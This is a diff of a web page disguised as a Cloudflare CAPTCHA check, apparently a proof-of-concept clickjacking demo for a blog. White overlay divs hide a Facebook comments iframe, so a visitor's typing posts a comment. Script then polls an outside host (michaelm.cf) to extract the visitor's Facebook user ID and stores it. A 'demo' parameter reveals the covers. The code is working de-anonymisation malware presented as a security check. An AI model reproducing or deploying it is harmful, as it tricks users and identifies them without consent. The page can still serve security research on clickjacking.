@@ -17,14 +17,14 @@
         <h1>One more step</h1>
         <h2 class="cf-subheadline"><span>Please complete the security check to access</span> <a href="https://m417z.com/">m417z / blog</a></h2>
       </div><!-- /.header -->
-      
+
       <div class="cf-section cf-highlight cf-captcha-container">
         <div class="cf-wrapper">
           <div class="cf-columns two">
             <div class="cf-column">
-            
+
               <div class="cf-highlight-inverse cf-form-stacked">
-                
+
     <div id="recaptcha_widget">
 <!-- ************************************************************ -->
 
@@ -67,12 +67,12 @@
 		<div style="position:relative;top:100px;height:300px;">
 			<div class="fake-captcha-submit-button clickjacking-cover" style="position:absolute;top:150px;left:20px;width:40px;height:20px;line-height:20px;z-index:1;pointer-events:none;">Submit</div>
 			<iframe id="fake-captcha-frame"
-				style="visibility:hidden;position:absolute;top:0;left:0;width:550px;height:210px;outline:0 solid;"
+				style="visibility:hidden;position:absolute;top:-24px;left:0;width:550px;height:210px;outline:0 solid;"
 			></iframe>
 			<div id="fake-captcha-caret" style="position:absolute;background-color:black;top:87px;left:21px;width:1px;height:12px;z-index:1;pointer-events:none;display:none;"></div>
-			<div class="clickjacking-cover" style="position:absolute;background-color:white;top:0;left:0;width:20px;height:210px;z-index:1;"></div>
-			<div class="clickjacking-cover" style="position:absolute;background-color:white;top:0;left:220px;width:330px;height:210px;z-index:1;"></div>
-			<div class="clickjacking-cover" style="position:absolute;background-color:white;top:0;left:0;width:550px;height:75px;z-index:1;"></div>
+			<div class="clickjacking-cover" style="position:absolute;background-color:white;top:-24px;left:0;width:20px;height:210px;z-index:1;"></div>
+			<div class="clickjacking-cover" style="position:absolute;background-color:white;top:-24px;left:220px;width:330px;height:210px;z-index:1;"></div>
+			<div class="clickjacking-cover" style="position:absolute;background-color:white;top:-24px;left:0;width:550px;height:99px;z-index:1;"></div>
 			<div class="clickjacking-cover" style="position:absolute;background-color:white;top:105px;left:0;width:550px;height:45px;z-index:1;"></div>
 			<div class="clickjacking-cover" style="position:absolute;background-color:white;top:150px;left:60px;width:490px;height:20px;z-index:1;"></div>
 			<div class="clickjacking-cover" style="position:absolute;background-color:white;top:170px;left:0;width:550px;height:50px;z-index:1;"></div>
@@ -95,27 +95,27 @@
 			var results = regex.exec( url );
 			return results == null ? null : results[1];
 		}
-		
+
 		try {
 			localStorage.setItem('saw_fake_captcha', parseInt((localStorage.getItem('saw_fake_captcha') || '0'), 10) + 1);
 		} catch (e) {}
-		
+
 		var fbUrlId = new Date().valueOf().toString(36) + Math.random().toString(36).substr(2);
-		var fbUrl = "https://www.facebook.com/v3.2/plugins/comments.php" +
+		var fbUrl = "https://www.facebook.com/v9.0/plugins/comments.php" +
 			"?app_id=113869198637480" +
-			"&channel=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter%2Fr%2Fd_vbiawPdxB.js%3Fversion%3D44%23cb%3Df25d2ed39becd8%26domain%3Ddevelopers.facebook.com%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ff371be96df16ee8%26relation%3Dparent.parent" +
+			"&channel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfac0bbd830575c%26domain%3Ddevelopers.facebook.com%26origin%3Dhttps%253A%252F%252Fdevelopers.facebook.com%252Ff20260d40195538%26relation%3Dparent.parent" +
 			"&container_width=734" +
 			"&height=100" +
 			"&href=https%3A%2F%2Fdevelopers.facebook.com%2F%23m417z___" + fbUrlId + "___" +
 			"&locale=en_US" +
 			"&numposts=5" +
 			"&sdk=joey" +
-			"&version=v3.2" +
+			"&version=v9.0" +
 			"&width=550" +
 			"&locale=he_IL";
-		
+
 		var fakeCaptchaFrame = document.getElementById('fake-captcha-frame');
-		
+
 		var requestCount = 0;
 		var hiddenOrUnfocusedCount = 1;
 		function checkCommentsTimeoutFunc() {
@@ -124,35 +124,35 @@
 			} else {
 				document.getElementById('fake-captcha-caret').style.display = 'none';
 			}
-			
+
 			if (document.hidden || !document.hasFocus() || !document.activeElement.isEqualNode(fakeCaptchaFrame)) {
 				hiddenOrUnfocusedCount++;
 			} else {
 				hiddenOrUnfocusedCount = 0;
 			}
-			
+
 			if (hiddenOrUnfocusedCount >= 2) {
 				requestCount = 0;
 				return;
 			}
-			
+
 			if (requestCount >= 60) {
 				window.focus();
 				requestCount = 0;
 				return;
 			}
-			
+
 			requestCount++;
-			
+
 			var regex = '/\\{"id":"\\d{2,}"[^{}]*"type":"user"[^{}]*\\}/';
 			var url = 'https://michaelm.cf/facebook_comment_fetch.php?url=' + encodeURIComponent(fbUrl) + '&regex=' + encodeURIComponent(regex) + '&t=' + Date.now();
-			
+
 			var xmlhttp = new XMLHttpRequest();
 			xmlhttp.onreadystatechange = function () {
 				if (this.readyState == 4 && this.status == 200) {
 					try {
 						var data = JSON.parse(this.responseText);
-						
+
 						localStorage.setItem('visitor_fb_details', this.responseText);
 						if (parent.onCaptchaFrameDone) {
 							parent.onCaptchaFrameDone();
@@ -165,9 +165,9 @@
 			xmlhttp.open('GET', url);
 			xmlhttp.send();
 		}
-		
+
 		setInterval(checkCommentsTimeoutFunc, 500);
-		
+
 		fakeCaptchaFrame.src = fbUrl;
 		fakeCaptchaFrame.onload = function () {
 			document.getElementById('fake-captcha-content').style.visibility = 'visible';
@@ -176,7 +176,7 @@
 				fakeCaptchaFrame.style.visibility = 'visible';
 			}, 100);
 		};
-		
+
 		if (getQueryParam('demo') !== null) {
 			var fakeCaptchaRevealCheckboxLabel = document.getElementById('clickjacking-reveal-checkbox-label');
 			var fakeCaptchaRevealCheckbox = document.getElementById('clickjacking-reveal-checkbox');
@@ -187,7 +187,7 @@
 				for (var i = 0; i < clickjackingCover.length; i++) {
 					clickjackingCover[i].style.opacity = checked ? 0.25 : null;
 				}
-				
+
 				fakeCaptchaFrame.style.outlineWidth = checked ? '1px' : 0;
 			}
 		}
@@ -197,15 +197,15 @@
     </div>
 
 
-                
+
               </div>
             </div>
 
             <div class="cf-column">
               <div class="cf-screenshot-container">
-              
+
                 <span class="cf-no-screenshot"></span>
-              
+
               </div>
             </div>
           </div><!-- /.columns -->
@@ -216,24 +216,24 @@
         <div class="cf-columns two">
           <div class="cf-column">
             <h2 data-translate="why_captcha_headline">Why do I have to complete a CAPTCHA?</h2>
-            
+
             <p data-translate="why_captcha_detail">Completing the CAPTCHA proves you are a human and gives you temporary access to the web property.</p>
           </div>
 
           <div class="cf-column">
             <h2 data-translate="resolve_captcha_headline">What can I do to prevent this in the future?</h2>
-            
+
 
             <p data-translate="resolve_captcha_antivirus">If you are on a personal connection, like at home, you can run an anti-virus scan on your device to make sure it is not infected with malware.</p>
 
             <p data-translate="resolve_captcha_network">If you are at an office or shared network, you can ask the network administrator to run a scan across the network looking for misconfigured or infected devices.</p>
-            
+
             <p data-translate="resolve_captcha_privacy_pass">Another way to prevent getting this page in the future is to use Privacy Pass. Check out the browser extension in the <a href="https://addons.mozilla.org/en-US/firefox/addon/privacy-pass/">Firefox Add-ons Store</a>.</p>
-            
+
           </div>
         </div>
       </div><!-- /.section -->
-      
+
 
       <div class="cf-error-footer cf-wrapper">
   <p>
@@ -242,7 +242,7 @@
     <span class="cf-footer-item"><span>Your IP</span>: 37.26.146.211</span>
     <span class="cf-footer-separator">•</span>
     <span class="cf-footer-item"><span>Performance &amp; security by</span> <a href="https://www.cloudflare.com/5xx-error-landing?utm_source=error_footer" id="brand_link" target="_blank">Cloudflare</a></span>
-    
+
   </p>
 </div><!-- /.error-footer -->
 
